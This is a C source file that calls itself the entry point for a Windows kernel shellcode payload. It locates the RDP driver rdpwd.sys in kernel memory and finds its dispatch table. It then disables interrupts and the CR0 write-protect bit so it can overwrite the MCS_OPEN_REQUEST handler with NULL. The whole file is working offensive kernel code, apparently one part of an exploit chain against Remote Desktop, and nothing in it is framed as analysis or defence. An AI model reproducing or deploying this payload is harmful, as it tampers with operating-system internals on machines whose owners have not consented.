/********************************************************
 * 
 * (C) COPYRIGHT AUTHORS, 2020
 *
 * TITLE:	ENTRY.C
 *
 * VERSION:	1.0
 *
 * DATE:	APRIL 07 2020
 *
 * Sample entrypoint for the kernel shellcode, with
 * c_EntryPoint marked as the programs "entry".
 *
 * THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
 * ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED 
 * TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A 
 * PARTICULAR PURPOSE.
 *
*********************************************************/
#define _WIN32_LEAN_AND_MEAN
#include <windows.h>
#include "common.h"

#define MCS_OPEN_REQUEST 39

#define H_NTOSKRNL 0x815d3210
#define H_RDPWD    0x8b39664d
#define H_RDATA    0x38b2f949

BOOL c_EntryPoint( VOID )
{
	LPVOID pNtosKrnl = ( LPVOID ) KeGetDriverBase( H_NTOSKRNL );
	LPVOID pRdpwdSys = ( LPVOID ) KeGetDriverBase( H_RDPWD );

	if ( ( pNtosKrnl != NULL ) && ( pRdpwdSys != NULL ) )
	{
		ULONG  SectionOffset      = 0;
		ULONG  SectionLength      = 0;
		PVOID *SectionBegPointer  = NULL;
		PVOID *DispatchTableEntry = NULL;
		PVOID  SectionEndPointer  = NULL;

		SectionOffset     = ( ULONG )( GetPeSectOffset( pRdpwdSys, H_RDATA, & SectionLength ) );
		SectionBegPointer = ( PVOID )( PTR_V( pRdpwdSys ) + SectionOffset );
		SectionEndPointer = ( PVOID )( PTR_V( pRdpwdSys ) + SectionOffset + SectionLength );

		do {
			if ( ( PTR_V( pRdpwdSys ) < PTR_V( SectionBegPointer[0] ) )             &&
			     ( PTR_V( pRdpwdSys ) < PTR_V( SectionBegPointer[1] ) )             &&
			     ( PTR_V( SectionBegPointer[0] )  < PTR_V( SectionEndPointer ) )    &&
			     ( PTR_V( SectionBegPointer[1] )  < PTR_V( SectionEndPointer ) )    &&
			     ( PTR_V( SectionBegPointer[2] ) != PTR_V( SectionBegPointer[3] ) ) &&
			     ( PTR_V( SectionBegPointer[4] ) == PTR_V( SectionBegPointer[5] ) )
			   ) { DispatchTableEntry = SectionBegPointer; break; };
		} while ( SectionLength-- != 0 && SectionBegPointer++ );

		__asm__ __volatile__( "cli\n" );
		__writecr0( __readcr0() & (~(1 << 16)));

		DispatchTableEntry[ MCS_OPEN_REQUEST ] = ( LPVOID ) NULL;
		
		__writecr0( __readcr0() | (1 << 16));
		__asm__ __volatile__( "sti\n" );
	};

	return TRUE;
};
